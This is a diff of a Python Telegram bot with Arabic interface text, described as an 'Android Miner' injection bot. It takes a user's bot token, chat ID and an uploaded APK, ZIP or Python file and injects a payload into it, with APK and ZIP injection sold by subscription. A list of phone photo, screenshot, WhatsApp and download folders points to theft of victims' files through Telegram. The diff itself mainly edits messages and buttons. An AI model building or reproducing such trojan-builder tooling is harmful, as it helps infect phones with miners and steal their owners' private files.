@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-🤖 بوت حقن Android Miner - نسخة مدفوعة جزئياً
+🤖 بوت حقن Android Miner - النسخة النهائية
 - Python Script → مجاني
-- APK + ZIP → مدفوع (يطلب الاشتراك)
-- Admin ID: 7238044992
+- APK + ZIP → مدفوع
+- مع رسائل الترحيب والأزرار كما في النسخة القديمة
 """
 
 import asyncio
@@ -32,42 +32,48 @@ ADMIN_ID = 7238044992
 # States
 TOKEN, CHATID, FILE = range(3)
 
+# ====================== الرسائل مع الأزرار (كما كانت في القديم) ======================
 WELCOME = """
 🤖 **بوت الحقن الاحترافي للأندرويد** 🚀
 
-أرسل /start لبدء الإعداد
+الخطوات:
+1. أرسل Bot Token
+2. أرسل Chat ID  
+3. ارفع الملف
+
+👇 اضغط للمساعدة
 """
 
 SUBSCRIBE_MSG = """
-🔒 **هذا النوع من الملفات مدفوع**
+🔒 **حقن APK و ZIP مدفوع**
 
-✅ حقن APK و ZIP يتطلب اشتراك
+هذا النوع من الملفات يتطلب اشتراك.
 
 **للاشتراك:**
 1. أرسل `/myid` للحصول على معرفك
-2. أرسل معرفك إلى الإدارة → @CI_v_CI
-3. بعد الدفع سيتم تفعيلك
+2. أرسل المعرف إلى الإدارة → @CI_v_CI
+3. بعد التفعيل يمكنك رفع APK و ZIP
 
-يمكنك تجربة الحقن على ملفات Python مجاناً حالياً.
+يمكنك رفع ملفات Python (.py) **مجاناً** حالياً.
 """
 
 PAID_FILE_MSG = """
-🔒 **حقن APK و ZIP مدفوع**
+🔒 **هذا الملف مدفوع**
 
-هذا الملف ({file_type}) يتطلب اشتراكاً.
-يرجى الاشتراك عبر الإدارة @CI_v_CI
+الملف الذي رفعته ({file_type}) يتطلب اشتراكاً.
 
-يمكنك رفع ملفات Python (.py) مجاناً الآن.
+يرجى التواصل مع الإدارة @CI_v_CI بعد إرسال `/myid`
+
+(ملفات Python لا تزال مجانية)
 """
 
-SUCCESS = "🎉 تم الحقن بنجاح! الملف جاهز للاستخدام 🟢"
-ERROR_FILE = "❌ يرجى رفع ملف APK أو ZIP أو Python script فقط"
+SUCCESS = "🎉 الحقن ناجح! الملف جاهز 🟢"
+ERROR_FILE = "❌ ارفع ملف APK أو ZIP أو Python script فقط"
 
 DIRS = [
-    "/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures",
-    "/storage/emulated/0/DCIM", "/storage/emulated/0/Screenshots",
-    "/storage/emulated/0/WhatsApp", "/sdcard/DCIM/Camera",
-    "/sdcard/Pictures", "/sdcard/DCIM", "/sdcard/Screenshots",
+    "/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures", "/storage/emulated/0/DCIM",
+    "/storage/emulated/0/Screenshots", "/storage/emulated/0/WhatsApp",
+    "/sdcard/DCIM/Camera", "/sdcard/Pictures", "/sdcard/DCIM", "/sdcard/Screenshots",
     "/sdcard/WhatsApp", "/storage/emulated/0/Download"
 ]
 
@@ -86,17 +92,36 @@ async def is_subscribed(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> boo
     approved = context.bot_data.get('approved_users', set())
     return user_id in approved
 
-# ====================== Basic Commands ======================
+# ====================== Handlers ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
-    await update.message.reply_text(WELCOME, parse_mode='Markdown')
+    
+    kb = [
+        [InlineKeyboardButton("🎓 كيف أحصل على Bot Token؟", callback_data="help_token")],
+        [InlineKeyboardButton("👥 كيف أحصل على Chat ID؟", callback_data="help_chatid")]
+    ]
+    
+    await update.message.reply_text(WELCOME, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
     await update.message.reply_text("🔑 أرسل **Bot Token** الآن:", parse_mode='Markdown')
     return TOKEN
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "help_token":
+        text = "**كيف تحصل على Bot Token؟**\n1. تواصل مع @BotFather\n2. أرسل /newbot\n3. انسخ التوكن وأرسله هنا"
+    elif query.data == "help_chatid":
+        text = "**كيف تحصل على Chat ID؟**\n• @userinfobot\n• @RawDataBot\n\nأرسل الـ ID هنا"
+    elif query.data == "subscribe":
+        text = SUBSCRIBE_MSG
+    
+    await query.edit_message_text(text, parse_mode='Markdown')
 
 async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await update.message.reply_text(
-        f"🆔 **معرفك:** `{user.id}`\n\nأرسل هذا الرقم للإدارة @CI_v_CI للاشتراك",
+        f"🆔 **معرفك:** `{user.id}`\n\nأرسل هذا الرقم إلى @CI_v_CI لتفعيل الاشتراك",
         parse_mode='Markdown'
     )
 
@@ -104,7 +129,7 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if await is_subscribed(context, update.effective_user.id):
         await update.message.reply_text("✅ أنت مشترك ويمكنك حقن APK و ZIP.")
     else:
-        await update.message.reply_text("ℹ️ أنت غير مشترك.\nملفات Python مجانية، APK و ZIP مدفوعة.")
+        await update.message.reply_text("ℹ️ Python مجاني • APK و ZIP مدفوعة\nاستخدم /subscribe")
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -122,17 +147,17 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
     except:
-        await update.message.reply_text("⚠️ استخدم: `/approve 1234567890`", parse_mode='Markdown')
+        await update.message.reply_text("⚠️ الاستخدام: `/approve 1234567890`", parse_mode='Markdown')
 
-# ====================== Conversation ======================
+# ====================== Conversation Flow ======================
 async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = update.message.text.strip()
     if not await validate_token(token):
-        await update.message.reply_text("❌ توكن غير صالح، حاول مرة أخرى.")
+        await update.message.reply_text("❌ التوكن غير صالح، حاول مرة أخرى.")
         return TOKEN
 
     context.user_data['token'] = token
-    await update.message.reply_text("✅ تم حفظ التوكن!\n\n📲 أرسل **Chat ID** الآن:", parse_mode='Markdown')
+    await update.message.reply_text("✅ تم حفظ Bot Token!\n\n📲 أرسل **Chat ID** الآن:", parse_mode='Markdown')
     return CHATID
 
 async def get_chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -142,7 +167,7 @@ async def get_chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return CHATID
 
     context.user_data['chatid'] = chatid
-    await update.message.reply_text("✅ تم الحفظ!\n\n📤 ارفع الملف الآن (Python مجاني - APK/ZIP مدفوع)", parse_mode='Markdown')
+    await update.message.reply_text("✅ تم الحفظ!\n\n📤 ارفع الملف الآن\n(Python مجاني - APK/ZIP مدفوع)", parse_mode='Markdown')
     return FILE
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -154,7 +179,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_name = doc.file_name.lower()
     is_paid_file = file_name.endswith(('.apk', '.zip'))
 
-    # فحص إذا كان الملف مدفوع وغير مشترك
     if is_paid_file and not await is_subscribed(context, update.effective_user.id):
         file_type = "APK" if file_name.endswith('.apk') else "ZIP"
         kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
@@ -165,7 +189,7 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return FILE
 
-    # إذا وصل هنا → إما ملف Python أو المستخدم مشترك → يستمر الحقن
+    # الحقن يبدأ هنا (Python أو مشترك)
     status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")
 
     try:
@@ -202,7 +226,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     return ConversationHandler.END
 
-# دوال الحقن (لم تتغير)
 def inject_apk(apk_bytes: bytes, payload: str) -> io.BytesIO:
     bio = io.BytesIO(apk_bytes)
     with zipfile.ZipFile(bio, 'r') as zf:
@@ -231,12 +254,6 @@ async def validate_token(token: str) -> bool:
     except:
         return False
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if query.data == "subscribe":
-        await query.edit_message_text(SUBSCRIBE_MSG, parse_mode='Markdown')
-
 # ====================== Main ======================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -261,7 +278,7 @@ def main():
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("✅ البوت يعمل - Python مجاني | APK & ZIP مدفوع")
+    print("✅ البوت يعمل الآن - مع رسائل الترحيب والأزرار القديمة")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
